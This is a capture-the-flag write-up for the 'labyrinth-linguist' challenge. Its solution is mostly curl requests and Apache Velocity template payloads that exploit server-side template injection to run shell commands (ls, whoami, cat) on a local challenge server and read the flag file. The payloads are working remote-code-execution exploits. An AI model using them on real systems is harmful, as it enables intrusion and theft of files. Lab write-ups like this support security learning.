# labyrinth-linguist

You and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant exterminator. While planning your next move you come across a translator device left by previous Fray competitors, it is used for translating english to voxalith, an ancient language spoken by the civilization that originally built the maze. It is known that voxalith was also spoken by the guardians of the maze that were once benign but then were turned against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with the mutant and claim your last chance to make it out alive.

## Solution

```sh
curl -X POST http://localhost:1337 \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "text=hello" | grep 'class="fire"'

curl -X POST http://localhost:1337 \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d 'text=$name' | grep 'class="fire"'
# World

curl -X POST http://localhost:1337 \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d 'text=#set($name="test")$name' | grep 'class="fire"'
# test

curl -X POST http://localhost:1337 \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d 'text=#set($name="test")$name' | grep 'class="fire"'

# https://github.com/epinna/tplmap/issues/9
#set($engine="string")#set($run=$engine.getClass().forName("java.lang.Runtime"))#set($runtime=$run.getRuntime())#set($proc=$runtime.exec("ls -al"))#set($null=$proc.waitFor())#set($istr=$proc.getInputStream())#set($chr=$engine.getClass().forName("java.lang.Character"))#set($output="")#set($string=$engine.getClass().forName("java.lang.String"))#foreach($i in [1..$istr.available()])#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))#end$output

curl -X POST http://localhost:1337 \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d 'text=#set($engine="string")#set($run=$engine.getClass().forName("java.lang.Runtime"))#set($runtime=$run.getRuntime())#set($proc=$runtime.exec("ls"))#set($null=$proc.waitFor())#set($istr=$proc.getInputStream())#set($chr=$engine.getClass().forName("java.lang.Character"))#set($output="")#set($string=$engine.getClass().forName("java.lang.String"))#foreach($i in [1..$istr.available()])#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))#end$output' | grep 'class="fire"'
# pom.xml


#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

curl -X POST http://localhost:1337 \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d 'text=#set($engine="string")#set($run=$engine.getClass().forName("java.lang.Runtime"))#set($runtime=$run.getRuntime())#set($proc=$runtime.exec("whoami"))#set($null=$proc.waitFor())#set($istr=$proc.getInputStream())#set($chr=$engine.getClass().forName("java.lang.Character"))#set($output="")#set($string=$engine.getClass().forName("java.lang.String"))#foreach($i in [1..$istr.available()])#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))#end$output' | grep 'class="fire"'
# root

curl -X POST http://localhost:1337 \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d 'text=#set($engine="string")#set($run=$engine.getClass().forName("java.lang.Runtime"))#set($runtime=$run.getRuntime())#set($proc=$runtime.exec("cat /flag.txt"))#set($null=$proc.waitFor())#set($istr=$proc.getInputStream())#set($chr=$engine.getClass().forName("java.lang.Character"))#set($output="")#set($string=$engine.getClass().forName("java.lang.String"))#foreach($i in [1..$istr.available()])#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))#end$output' | grep 'class="fire"'

   
```

```txt
#set($engine="string")
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("cat /flag.txt"))
#set($null=$proc.waitFor())
#set($istr=$proc.getInputStream())
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($output="")
#set($string=$engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
$output

#set($engine = "string")
#set($run = $engine.getClass().forName("java.lang.Runtime"))
#set($runtime = $run.getRuntime())
#set($proc = $runtime.exec("cat pom.xml"))
#set($null = $proc.waitFor())
#set($istr = $proc.getInputStream())
#set($chr = $engine.getClass().forName("java.lang.Character"))
#set($output = "")
#set($string = $engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
  #set($charCode=$istr.read())
  #if($charCode != -1)
    #set($char = $chr.toChars($charCode))
    #set($output = $output.concat($string.valueOf($char)))
  #end
#end
$output
```

```txt
Leak the flag name:

#set($engine = "string")
#set($run = $engine.getClass().forName("java.lang.Runtime"))
#set($runtime = $run.getRuntime())
#set($proc = $runtime.exec("ls /"))
#set($null = $proc.waitFor())
#set($istr = $proc.getInputStream())
#set($chr = $engine.getClass().forName("java.lang.Character"))
#set($output = "")
#set($string = $engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
  #set($charCode=$istr.read())
  #if($charCode != -1)
    #set($char = $chr.toChars($charCode))
    #set($output = $output.concat($string.valueOf($char)))
  #end
#end
$output

output the flag: 

#set($engine = "string")
#set($run = $engine.getClass().forName("java.lang.Runtime"))
#set($runtime = $run.getRuntime())
#set($proc = $runtime.exec("cat /flagbf8f4b4019.txt"))
#set($null = $proc.waitFor())
#set($istr = $proc.getInputStream())
#set($chr = $engine.getClass().forName("java.lang.Character"))
#set($output = "")
#set($string = $engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
  #set($charCode=$istr.read())
  #if($charCode != -1)
    #set($char = $chr.toChars($charCode))
    #set($output = $output.concat($string.valueOf($char)))
  #end
#end
$output


```
